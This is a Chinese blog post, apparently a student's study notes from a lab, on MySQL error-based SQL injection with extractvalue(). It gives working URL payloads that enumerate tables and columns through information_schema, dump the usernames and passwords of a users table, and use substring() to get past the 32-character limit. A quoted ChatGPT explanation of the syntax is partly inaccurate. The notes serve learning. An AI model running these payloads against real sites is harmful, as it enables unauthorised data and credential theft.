@@ -1,0 +1,150 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#4 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#4</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-04T11:05:15.000Z" id="date"> 2023-06-04</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-16T06:48:48.283Z" id="updated"> 2023-06-16</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习extractvalue报错注入</p>
+<span id="more"></span>
+
+<p>今天开始前把靶场环境搭建了一下，</p>
+<p>花了不少时间</p>
+<p>今天学习的报错注入是一个庞大的家族，</p>
+<p>（他应该属于字符型注入</p>
+<p>有多少？见下图</p>
+
+
+<h1 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1 创建数据库"></a>1 创建数据库</h1><p>按照课程ppt的演示，</p>
+<p>先创建一个叫xml数据库吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; create database ctfsu charset utf8;<br>Query OK, 1 row affected (0.00 sec)<br><br>mysql&gt; use ctfsu<br>Database changed<br>mysql&gt; create table xml(doc varchar(150));<br>Query OK, 0 rows affected (0.01 sec)<br></code></pre></td></tr></table></figure>
+
+<p>然后抄一下他ppt里面的语句</p>
+<p>extractvalue函数的介绍是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">EXTRACTVALUE 函数是 SQL 中的 XML 函数之一，用于从 XML 文档中提取指定节点的值。<br><br>该函数需要两个参数：XML文档和XPath表达式（XML路径语言），返回值为满足XPath表达式的第一个节点的值。如果未找到任何节点，则返回 NULL。<br></code></pre></td></tr></table></figure>
+
+<h1 id="2-Basic"><a href="#2-Basic" class="headerlink" title="2 Basic"></a>2 Basic</h1><p>然后他的概念就是通过报错回显数据</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select extractvalue(doc,concat(0x7e,(select database()))) from xml;<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~ctfsu&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>所以这里可以知道他的数据库名字了，</p>
+<p><strong>但是为什么知道他的文档名叫doc呢？concat又是什么函数？0x7e又是什么意思？</strong></p>
+<p>问一下chatgpt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这段SQL语句是一种典型的XML注入攻击方式，它利用了MySQL数据库中“ExtractValue()”函数漏洞，可以使攻击者在不登录的情况下访问敏感数据。<br><br>具体而言：<br><br>doc 应该代表一个XML文档名或路径，攻击者需要在sql查询之前探测出目标数据库中存在一个可供利用的XML文档并将其替换为正确的文档名或路径。<br>concat() 是一个字符串函数，它将多个字符串连接起来形成一个字符串。在这里，攻击者使用 0x7e 字符进行字符串拼接， 0x7e 在ASCII表中的十进制值是“126”，表示波浪号（~）。<br>extractvalue() 函数用于从XML文档中提取值，类似于XPath查询。但是 extractvalue() 函数被认为是已弃用函数，并且可能导致安全问题，因为它允许将未经过滤的输入作为xpath字符串使用，这会导致SQL注入。<br>因为程序员没有对传递给 extractvalue() 函数的参数进行合适的编码或过滤，攻击者可以通过注入SQL语句，绕过原本的措施获取所需的信息。<br></code></pre></td></tr></table></figure>
+
+<p><strong>那concat函数和group_concat函数有什么区别？</strong></p>
+<p>sql中，<code>concat()</code>和<code>group_concat()</code>函数都是SQL中的字符串函数，但它们之间有一些关键的区别。</p>
+<ul>
+<li><p><code>concat()</code>函数将两个或多个字符串联系在一起形成一个新的字符串。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT CONCAT(&#x27;Hello&#x27;,&#x27; &#x27;,&#x27;world!&#x27;) AS greeting;<br></code></pre></td></tr></table></figure>
+
+<p>运行以上代码后，将会返回一个值为”Hello world!”的结果集。</p>
+</li>
+<li><p><code>group_concat()</code> 函数用于将一个组内的多行数据串联为一个字符串。在 MySQL 中，组级别的连接可以通过 <code>GROUP BY</code> 和 <code>GROUP_CONCAT()</code> 结合使用来执行。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT category, GROUP_CONCAT(product_name SEPARATOR &#x27;-&#x27;) as products <br>FROM products_table <br>GROUP BY category;<br></code></pre></td></tr></table></figure>
+
+<p>在这个例子中， <code>GROUP_CONCAT()</code> 按类别分组，并拼接现有的 <code>product_name</code> 列中所有产品的名称，其中每个产品名称由破折号“-”分隔。 最终结果可能类似于以下内容：</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Products</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Clothing</td>
+<td>T-Shirt-Jeans</td>
+</tr>
+<tr>
+<td>Electronics</td>
+<td>Camera-Headphones</td>
+</tr>
+<tr>
+<td>Outdoor</td>
+<td>Backpack-Tent</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p>因此，<code>concat()</code>主要是用于将多个输入字符串连接成一个字符串并返回，而 <code>group_concat()</code> 更适用于将聚合结果拼接成单个字符串，通常在与 GROUP BY 子句一起使用的时候</p>
+<h1 id="3-开始注入"><a href="#3-开始注入" class="headerlink" title="3 开始注入"></a>3 开始注入</h1><p>构造如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(database()))) --+<br></code></pre></td></tr></table></figure>
+
+<p>得到数据库名</p>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))) --+<br></code></pre></td></tr></table></figure>
+
+<p>得到所有表名，然后凭经验（或者凭英语）挑一个表，构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;))) --+<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-1-0-弊端"><a href="#3-1-0-弊端" class="headerlink" title="3.1.0 弊端"></a>3.1.0 弊端</h2><p>只能返回32个字符</p>
+<h2 id="3-1-1-解决方法"><a href="#3-1-1-解决方法" class="headerlink" title="3.1.1 解决方法"></a>3.1.1 解决方法</h2><p>那么就无法获得32字符之后的东西了吗？</p>
+<p>介绍一个函数substring</p>
+<p><code>SUBSTRING()</code> 函数用于提取字符串的一部分，语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SUBSTRING(str, start, length)<br></code></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<ul>
+<li><code>str</code>为要截取的字符串。</li>
+<li><code>start</code>为起始位置。如果是正数，则表示从 <code>str</code> 的第 <code>n</code> 个字符开始截取；如果是负数，则表示从 <code>str</code> 的倒数第 <code>n</code> 个字符开始截取。</li>
+<li><code>length</code>(可选) 表示要截取的长度。如果忽略此参数，则返回从 <code>start</code> 位置到字符串结尾的所有字符。</li>
+</ul>
+<p>例如，假设有一个字符串：<code>Hello World!</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT SUBSTRING(&#x27;Hello World!&#x27;, 7); -- 输出 &#x27;World!&#x27;<br>SELECT SUBSTRING(&#x27;Hello World!&#x27;, -6); -- 输出 &#x27;World!&#x27;<br>SELECT SUBSTRING(&#x27;Hello World!&#x27;, 1, 5); -- 输出 &#x27;Hello&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>在 SQL 中，<code>SUBSTRING()</code> 函数通常用于查询操作中，可以根据需要获取指定的字段。除此之外，也可以与其他函数和表达式组合使用，实现复杂的字符串处理逻辑。</p>
+<h1 id="3-1-继续注入"><a href="#3-1-继续注入" class="headerlink" title="3.1 继续注入"></a>3.1 继续注入</h1><p>继续前面</p>
+<p>根据获取的列名和表名查询表中的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users))) --+<br></code></pre></td></tr></table></figure>
+
+<p>发现只能看到前面的内容，后面的内容看不到</p>
+<p>这里用上前面的substring()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(id,username,password) from users),31,31))) --+<br></code></pre></td></tr></table></figure>
+
+<p>注意括号别画错了</p>
+<p>然后就结束了</p>
+<h1 id="4-结束"><a href="#4-结束" class="headerlink" title="4 结束"></a>4 结束</h1><p>今天学习的extractvalue就是报错注入中方非常经典的一种了，</p>
+<p>其原理就是通过报错的回显获取回显</p>
+<p>主要语句如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select extractvalue(随便填,concat(0x7e,字符型基本语句)) --+<br></code></pre></td></tr></table></figure>
+
+<p>到后面配合substring()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select extractvalue(随便填,concat(0x7e,substring(字符型基本语句,起始,长度))) --+<br></code></pre></td></tr></table></figure>
+
+<p>就行了</p>
+<p>结束！</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/05/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5/">← Next Sql注入学习笔记#5</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/03/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/">Sql注入学习笔记#3 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">1 创建数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Basic"><span class="toc-number">2.</span> <span class="toc-text">2 Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">3 开始注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-0-%E5%BC%8A%E7%AB%AF"><span class="toc-number">3.1.</span> <span class="toc-text">3.1.0 弊端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-1-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">3.1.1 解决方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-1-%E7%BB%A7%E7%BB%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">3.1 继续注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E7%BB%93%E6%9D%9F"><span class="toc-number">5.</span> <span class="toc-text">4 结束</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
